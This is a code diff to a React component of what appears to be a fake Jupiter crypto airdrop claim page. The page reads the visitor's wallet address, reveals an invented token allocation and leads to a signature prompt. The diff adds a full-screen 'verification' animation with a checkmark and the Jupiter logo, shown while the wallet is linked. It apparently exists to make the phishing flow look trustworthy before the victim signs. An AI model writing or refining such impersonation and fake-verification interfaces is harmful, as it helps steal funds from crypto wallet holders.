@@ -53,6 +53,8 @@ export default function Connect() {
   const [adresse, setAdresse] = useState(ADRESSE_REPLI)
   const [reclame, setReclame] = useState(false)
   const [hote, setHote] = useState('')
+  // Animation noire de verification lors de la connexion
+  const [verification, setVerification] = useState(false)
   useEffect(() => setHote(window.location.hostname), [])
 
   // Recuperer le prix live du JUP des l'arrivee, avec repli si l'API echoue
@@ -91,14 +93,23 @@ export default function Connect() {
     return () => cancelAnimationFrame(raf)
   }, [connecte, cible])
 
+  // Masquer l'animation de verification une fois l'allocation revele
+  useEffect(() => {
+    if (revele) {
+      const timer = setTimeout(() => setVerification(false), 600)
+      return () => clearTimeout(timer)
+    }
+  }, [revele])
+
   // Connect Wallet : ouvre la liste des wallets
   const ouvrirFeuille = () => setFeuille(true)
   // Choix de Jupiter : on lie le wallet (sans quitter le site), on ferme la
   // feuille, puis on revele l'allocation
   const choisirJupiter = async () => {
+    setVerification(true)
+    setFeuille(false)
     const a = await lireAdresseWallet()
     if (a) setAdresse(abrege(a))
-    setFeuille(false)
     setConnecte(true)
   }
   // Claim : ouvre l'ecran de signature
@@ -130,6 +141,44 @@ export default function Connect() {
           font-family: 'Inter Tight', 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
           display: flex; align-items: center; justify-content: center;
           padding: 28px 34px;
+        }
+        /* Écran de verification noir */
+        .verif-fond {
+          position: fixed; inset: 0; z-index: 70;
+          background: #02060E;
+          display: flex; flex-direction: column; align-items: center;
+          animation: verif-fondu 0.2s ease-out;
+        }
+        .verif-icone {
+          width: 128px; height: 128px; margin-top: 9vh;
+          background: #000; border: 2px solid #2f8f52; border-radius: 30px;
+          box-shadow: 0 0 24px rgba(76, 224, 122, 0.25);
+          animation: verif-entree 0.4s cubic-bezier(.2, .8, .2, 1);
+        }
+        .verif-plein { opacity: 0; animation: verif-plein-in 0.3s ease 1s forwards; }
+        .verif-arc {
+          transform-origin: 50% 50%;
+          animation: verif-tourne 0.85s linear infinite, verif-arc-out 0.3s ease 1s forwards;
+        }
+        .verif-chevron { animation: verif-fade-out 0.25s ease 0.95s forwards; }
+        .verif-coche {
+          opacity: 0; transform-origin: 50% 50%;
+          animation: verif-coche-in 0.35s cubic-bezier(.2, .9, .3, 1.2) 1.05s forwards;
+        }
+        .verif-logo {
+          position: absolute; top: 50%; left: 50%;
+          width: 92px; height: 92px; transform: translate(-50%, -50%);
+        }
+        @keyframes verif-fondu { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes verif-entree { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        @keyframes verif-tourne { to { transform: rotate(360deg); } }
+        @keyframes verif-arc-out { to { opacity: 0; } }
+        @keyframes verif-plein-in { to { opacity: 1; } }
+        @keyframes verif-fade-out { to { opacity: 0; } }
+        @keyframes verif-coche-in { from { opacity: 0; transform: scale(0.5); } to { opacity: 1; transform: scale(1); } }
+        @media (prefers-reduced-motion: reduce) {
+          .verif-arc, .verif-chevron, .verif-coche, .verif-plein, .verif-icone { animation: none; }
+          .verif-arc { display: none; } .verif-plein, .verif-coche { opacity: 1; }
         }
         .carte {
           position: relative; width: 100%; max-width: 420px;
@@ -397,6 +446,22 @@ export default function Connect() {
             </div>
             <div className="sig-note">Only confirm if you trust this website</div>
           </div>
+        </div>
+      )}
+
+      {/* --- Animation noire de verification --- */}
+      {verification && (
+        <div className="verif-fond">
+          <div className="verif-icone">
+            <svg viewBox="0 0 100 100" width="100%" height="100%">
+              <circle cx="50" cy="50" r="33" fill="none" stroke="#173224" strokeWidth="4" />
+              <circle className="verif-plein" cx="50" cy="50" r="33" fill="none" stroke="#4CE07A" strokeWidth="4" />
+              <circle className="verif-arc" cx="50" cy="50" r="33" fill="none" stroke="#4CE07A" strokeWidth="4" strokeLinecap="round" strokeDasharray="52 155" />
+              <path className="verif-chevron" d="M38 45 L50 56 L62 45" fill="none" stroke="#4CE07A" strokeWidth="5" strokeLinecap="round" strokeLinejoin="round" />
+              <path className="verif-coche" d="M37 50 L46 60 L64 40" fill="none" stroke="#4CE07A" strokeWidth="5" strokeLinecap="round" strokeLinejoin="round" />
+            </svg>
+          </div>
+          <img className="verif-logo" src="/assets/jupiter-logo.png" alt="Jupiter" />
         </div>
       )}
     </>
